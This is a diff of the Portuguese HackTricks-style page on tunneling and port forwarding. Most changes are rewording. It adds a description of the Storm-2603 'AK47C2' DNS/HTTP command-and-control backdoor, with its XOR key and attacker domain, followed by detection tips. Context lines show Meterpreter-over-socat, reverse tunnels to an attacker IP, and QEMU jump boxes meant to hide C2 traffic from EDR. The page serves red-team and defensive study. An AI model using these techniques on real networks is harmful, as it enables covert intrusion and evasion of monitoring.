@@ -1,11 +1,11 @@
-# Tunneling and Port Forwarding
+# Tunneling e Encaminhamento de Portas
 
 {{#include ../banners/hacktricks-training.md}}
 
 ## Dica do Nmap
 
 > [!WARNING]
-> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta de ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
+> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta por ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
 
 ## **Bash**
 
@@ -157,7 +157,7 @@ rportfwd stop [bind port]
 Para notar:
 
 - O **reencaminhamento de porta reversa do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para relatar entre máquinas individuais**.
-- O tráfego é **tuneado dentro do tráfego C2 do Beacon**, incluindo links P2P.
+- O tráfego é **túnel dentro do tráfego C2 do Beacon**, incluindo links P2P.
 - **Privilégios de administrador não são necessários** para criar reencaminhamentos de porta reversa em portas altas.
 
 ### rPort2Port local
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter através de SSL Socat
+### Meterpreter através do SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -348,7 +348,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Você precisa ter **acesso RDP sobre o sistema**.\
 Baixe:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta utiliza `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
@@ -377,7 +377,7 @@ Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxific
 ## Bypass de proxy NTLM
 
 A ferramenta mencionada anteriormente: **Rpivot**\
-**OpenVPN** também pode contorná-lo, configurando essas opções no arquivo de configuração:
+**OpenVPN** também pode contorná-lo, configurando estas opções no arquivo de configuração:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -394,7 +394,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você configurar, por exemplo, no alvo, o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
 Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está escutando na porta 2222.
 
 ## YARP
@@ -444,11 +444,45 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Mudar o DNS do proxychains
 
-Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (hardcoded). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
+Proxychains intercepta a chamada `gethostbyname` da libc e canaliza a solicitação de DNS TCP através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (hardcoded). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
 
 ## Túneis em Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
+
+### C2 TXT DNS / HTTP JSON personalizado (AK47C2)
+
+O ator Storm-2603 criou um **C2 de canal duplo ("AK47C2")** que abusa *apenas* de tráfego **DNS** e **HTTP POST** simples – dois protocolos que raramente são bloqueados em redes corporativas.
+
+1. **Modo DNS (AK47DNS)**
+• Gera um SessionID aleatório de 5 caracteres (por exemplo, `H4T14`).
+• Precede `1` para *solicitações de tarefa* ou `2` para *resultados* e concatena diferentes campos (flags, SessionID, nome do computador).
+• Cada campo é **XOR-encriptado com a chave ASCII `VHBD@H`**, codificado em hex e colado junto com pontos – terminando finalmente com o domínio controlado pelo atacante:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• As solicitações usam `DnsQuery()` para registros **TXT** (e fallback **MG**).
+• Quando a resposta excede 0xFF bytes, o backdoor **fragmenta** os dados em pedaços de 63 bytes e insere os marcadores:
+`s<SessionID>t<TOTAL>p<POS>` para que o servidor C2 possa reordená-los.
+
+2. **Modo HTTP (AK47HTTP)**
+• Constrói um envelope JSON:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• O blob inteiro é XOR-`VHBD@H` → hex → enviado como o corpo de um **`POST /`** com o cabeçalho `Content-Type: text/plain`.
+• A resposta segue a mesma codificação e o campo `cmd` é executado com `cmd.exe /c <command> 2>&1`.
+
+Notas da Blue Team
+• Procure por **consultas TXT** incomuns cujo primeiro rótulo é um hexadecimal longo e sempre termina em um domínio raro.
+• Uma chave XOR constante seguida de ASCII-hex é fácil de detectar com YARA: `6?56484244?484` (`VHBD@H` em hex).
+• Para HTTP, sinalize corpos de POST text/plain que são puro hex e múltiplos de dois bytes.
+
+{{#note}}
+Todo o canal se encaixa dentro de **consultas padrão compatíveis com RFC** e mantém cada rótulo de subdomínio abaixo de 63 bytes, tornando-o furtivo na maioria dos logs de DNS.
+{{#endnote}}
 
 ## Tunneling ICMP
 
@@ -457,7 +491,7 @@ Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicita�
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root é necessário em ambos os sistemas para criar adaptadores tun e encaminhar dados entre eles usando solicitações de eco ICMP.
+Root é necessário em ambos os sistemas para criar adaptadores tun e canalizar dados entre eles usando solicitações de eco ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -498,7 +532,7 @@ chmod a+x ./ngrok
 
 **Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_Também é possível adicionar autenticação e TLS, se necessário._
+_É também possível adicionar autenticação e TLS, se necessário._
 
 #### Tunneling TCP
 ```bash
@@ -572,11 +606,11 @@ Inicie o conector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Porque todo o tráfego sai do host **para fora pela porta 443**, túneis Cloudflared são uma maneira simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use contêineres ou a flag `--user` quando possível.
+Porque todo o tráfego sai do host **saindo pela porta 443**, os túneis Cloudflared são uma maneira simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use contêineres ou a flag `--user` quando possível.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da **v0.53.0 (Maio de 2024)**, ele pode atuar como um **Gateway de Túnel SSH**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
+[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da **v0.53.0 (Maio de 2024)**, ele pode atuar como um **SSH Tunnel Gateway**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
 
 ### Túnel TCP reverso clássico
 ```bash
@@ -612,7 +646,7 @@ O comando acima publica a porta da vítima **8080** como **attacker_ip:9000** se
 
 A rede em modo usuário do QEMU (`-netdev user`) suporta uma opção chamada `hostfwd` que **vincula uma porta TCP/UDP no *host* e a encaminha para o *guest***. Quando o guest executa um daemon SSH completo, a regra hostfwd fornece a você uma caixa de salto SSH descartável que vive inteiramente dentro de uma VM efêmera – perfeita para ocultar o tráfego C2 do EDR, pois toda atividade e arquivos maliciosos permanecem no disco virtual.
 
-### Linha de comando rápida
+### Linha única rápida
 ```powershell
 # Windows victim (no admin rights, no driver install – portable binaries only)
 qemu-system-x86_64.exe ^
@@ -623,7 +657,7 @@ qemu-system-x86_64.exe ^
 -nographic
 ```
 • O comando acima inicia uma imagem do **Tiny Core Linux** (`tc.qcow2`) na RAM.  
-• A porta **2222/tcp** no host Windows é encaminhada de forma transparente para **22/tcp** dentro do convidado.  
+• A porta **2222/tcp** no host Windows é encaminhada de forma transparente para **22/tcp** dentro da máquina virtual.  
 • Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; quaisquer pacotes que a alcancem são tratados pelo servidor SSH em execução na VM.  
 
 ### Lançando de forma furtiva através do VBScript
@@ -650,13 +684,13 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 ### Por que isso evita a detecção
 
-• Apenas dois executáveis não assinados (`qemu-system-*.exe`) acessam o disco; nenhum driver ou serviço é instalado.  
+• Apenas dois executáveis não assinados (`qemu-system-*.exe`) tocam no disco; nenhum driver ou serviço é instalado.  
 • Produtos de segurança no host veem **tráfego de loopback benigno** (o C2 real termina dentro da VM).  
 • Scanners de memória nunca analisam o espaço do processo malicioso porque ele vive em um sistema operacional diferente.
 
 ### Dicas para o Defender
 
-• Alerta sobre **binários inesperados do QEMU/VirtualBox/KVM** em caminhos graváveis pelo usuário.  
+• Alerta sobre **binários QEMU/VirtualBox/KVM inesperados** em caminhos graváveis pelo usuário.  
 • Bloquear conexões de saída que se originam de `qemu-system*.exe`.  
 • Caçar por portas de escuta raras (2222, 10022, …) que se vinculam imediatamente após um lançamento do QEMU.
 
@@ -670,5 +704,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Referências
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)  
 
 {{#include ../banners/hacktricks-training.md}}
